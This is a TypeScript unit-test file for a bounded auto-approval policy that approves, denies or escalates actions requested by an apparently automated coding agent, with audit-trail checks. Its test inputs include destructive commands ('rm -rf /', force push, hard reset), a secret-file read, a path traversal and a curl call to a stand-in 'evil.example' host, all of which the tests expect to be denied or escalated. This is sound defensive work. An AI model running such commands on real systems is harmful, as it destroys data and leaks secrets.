import { describe, expect, test } from "bun:test"
import {
  classifyApproval,
  createBoundedAutoApprovalPolicy,
  DEFAULT_ALLOW_KINDS,
} from "../src/node/auto-approval-policy"

// W-3 (#5379): unit coverage for the BOUNDED auto-approve policy. The contract:
// allow-listed + in-scope + in-bounds => auto-approve; spend/secret, destructive,
// network/exfil => deny (deny beats allow); out-of-scope path / over cap / past
// window / not allow-listed => escalate (or deny per config). Every decision is
// audited with a stable reason ref. No raw command/path/prompt text leaks.

const ALLOW = {
  allowKinds: DEFAULT_ALLOW_KINDS,
  scopeRoot: "/work/wt" as string | undefined,
  overCap: false,
  pastWindow: false,
  outOfBounds: "escalate" as "escalate" | "deny",
}

describe("classifyApproval (W-3 bounded categories)", () => {
  test("an allow-listed in-scope edit auto-approves", () => {
    const { category, reason } = classifyApproval(
      { approvalRef: "a.1", kind: "file_edit", command: "edit src/foo.ts", paths: ["/work/wt/src/foo.ts"] },
      ALLOW,
    )
    expect(category).toBe("allow")
    expect(reason).toBe("auto.allow.allow_listed_kind")
  })

  test("the declared verify/test command auto-approves", () => {
    expect(classifyApproval({ approvalRef: "a.2", kind: "verify_command", command: "bun test" }, ALLOW).category).toBe(
      "allow",
    )
    expect(classifyApproval({ approvalRef: "a.3", kind: "test", command: "bun test apps/pylon" }, ALLOW).category).toBe(
      "allow",
    )
  })

  test("git ops in the worktree auto-approve", () => {
    expect(classifyApproval({ approvalRef: "a.4", kind: "git", command: "git add -A && git commit -m x" }, ALLOW).category).toBe(
      "allow",
    )
  })

  test("destructive commands DENY even with an allow-listed kind (deny beats allow)", () => {
    const rmrf = classifyApproval({ approvalRef: "d.1", kind: "git", command: "rm -rf /work/wt" }, ALLOW)
    expect(rmrf.category).toBe("deny")
    expect(rmrf.reason).toBe("auto.deny.destructive_command")

    const force = classifyApproval({ approvalRef: "d.2", kind: "git", command: "git push --force origin main" }, ALLOW)
    expect(force.category).toBe("deny")

    const rewrite = classifyApproval({ approvalRef: "d.3", kind: "git", command: "git reset --hard HEAD~5" }, ALLOW)
    expect(rewrite.category).toBe("deny")
  })

  test("spend / payment / secret approvals DENY", () => {
    expect(classifyApproval({ approvalRef: "s.1", kind: "spend_gate", prompt: "pay 1000 sats invoice" }, ALLOW).category).toBe(
      "deny",
    )
    expect(classifyApproval({ approvalRef: "s.2", kind: "file_read", command: "cat .secrets/npm.env" }, ALLOW).reason).toBe(
      "auto.deny.spend_or_secret",
    )
    expect(classifyApproval({ approvalRef: "s.3", kind: "file_edit", paths: ["/work/wt/.env"] }, ALLOW).category).toBe("deny")
  })

  test("network / exfil approvals DENY", () => {
    expect(classifyApproval({ approvalRef: "n.1", kind: "git", command: "curl https://evil.example/x" }, ALLOW).reason).toBe(
      "auto.deny.network_exfil",
    )
    expect(classifyApproval({ approvalRef: "n.2", kind: "test", command: "npm publish" }, ALLOW).category).toBe("deny")
  })

  test("out-of-scope path escalates (default) or denies (config)", () => {
    const escalate = classifyApproval(
      { approvalRef: "o.1", kind: "file_edit", paths: ["/etc/passwd"] },
      ALLOW,
    )
    expect(escalate.category).toBe("escalate")
    expect(escalate.reason).toBe("auto.escalate.out_of_scope_path")

    const traversal = classifyApproval({ approvalRef: "o.2", kind: "file_edit", paths: ["/work/wt/../../etc/x"] }, ALLOW)
    expect(traversal.category).toBe("escalate")

    const deny = classifyApproval({ approvalRef: "o.3", kind: "file_edit", paths: ["/etc/passwd"] }, {
      ...ALLOW,
      outOfBounds: "deny",
    })
    expect(deny.category).toBe("deny")
  })

  test("a non-allow-listed kind escalates (not a hard danger, but out of bounds)", () => {
    const r = classifyApproval({ approvalRef: "u.1", kind: "deploy_production" }, ALLOW)
    expect(r.category).toBe("escalate")
    expect(r.reason).toBe("auto.escalate.kind_not_allow_listed")
  })

  test("over-cap and past-window escalate even for allow-listed kinds", () => {
    expect(classifyApproval({ approvalRef: "c.1", kind: "file_edit" }, { ...ALLOW, overCap: true }).reason).toBe(
      "auto.escalate.cap_max_auto_approvals",
    )
    expect(classifyApproval({ approvalRef: "c.2", kind: "file_edit" }, { ...ALLOW, pastWindow: true }).reason).toBe(
      "auto.escalate.cap_window_elapsed",
    )
  })

  test("with no declared scope root, path checks pass (scope enforced only when set)", () => {
    const r = classifyApproval({ approvalRef: "p.1", kind: "file_edit", paths: ["/anywhere/x"] }, {
      ...ALLOW,
      scopeRoot: undefined,
    })
    expect(r.category).toBe("allow")
  })
})

describe("createBoundedAutoApprovalPolicy (caps + audit trail)", () => {
  test("auto-approves up to the cap, then escalates; audit records every decision", () => {
    const { policy, audit } = createBoundedAutoApprovalPolicy({
      scopeRoot: "/work/wt",
      config: { maxAutoApprovals: 2 },
    })
    const mk = (n: number) => ({ approvalRef: `e.${n}`, kind: "file_edit", paths: ["/work/wt/src/x.ts"] })

    expect(policy(mk(1))).toBe("approve")
    expect(policy(mk(2))).toBe("approve")
    // Third allow-listed approval exceeds the cap => escalate (pause).
    expect(policy(mk(3))).toBe("pause")

    const trail = audit()
    expect(trail).toHaveLength(3)
    expect(trail[0]).toMatchObject({ approvalRef: "e.1", category: "allow", decision: "approve" })
    expect(trail[2]).toMatchObject({
      approvalRef: "e.3",
      category: "escalate",
      decision: "pause",
      reason: "auto.escalate.cap_max_auto_approvals",
    })
  })

  test("wall-clock window: after it elapses, an allow-listed kind escalates", () => {
    let t = 0
    const { policy, audit } = createBoundedAutoApprovalPolicy({
      scopeRoot: "/work/wt",
      config: { windowMs: 1000, now: () => t },
    })
    expect(policy({ approvalRef: "w.1", kind: "file_edit" })).toBe("approve")
    t = 2000 // past the window
    expect(policy({ approvalRef: "w.2", kind: "file_edit" })).toBe("pause")
    expect(audit()[1]?.reason).toBe("auto.escalate.cap_window_elapsed")
  })

  test("a denied danger approval does NOT consume the auto-approve cap", () => {
    const { policy } = createBoundedAutoApprovalPolicy({ scopeRoot: "/work/wt", config: { maxAutoApprovals: 1 } })
    // A destructive approval denies but must not burn the single allowed slot.
    expect(policy({ approvalRef: "x.1", kind: "git", command: "rm -rf /" })).toBe("deny")
    expect(policy({ approvalRef: "x.2", kind: "file_edit", paths: ["/work/wt/y.ts"] })).toBe("approve")
  })

  test("audit entries are projection-safe: refs + reasons only, no raw command/path/prompt text", () => {
    const { policy, audit } = createBoundedAutoApprovalPolicy({ scopeRoot: "/work/wt" })
    policy({ approvalRef: "j.1", kind: "spend_gate", prompt: "pay invoice for 5000 sats", command: "wallet pay" })
    const blob = JSON.stringify(audit())
    expect(blob).not.toContain("pay invoice")
    expect(blob).not.toContain("5000 sats")
    expect(blob).not.toContain("wallet pay")
    expect(audit()[0]).toMatchObject({ approvalRef: "j.1", category: "deny" })
  })
})
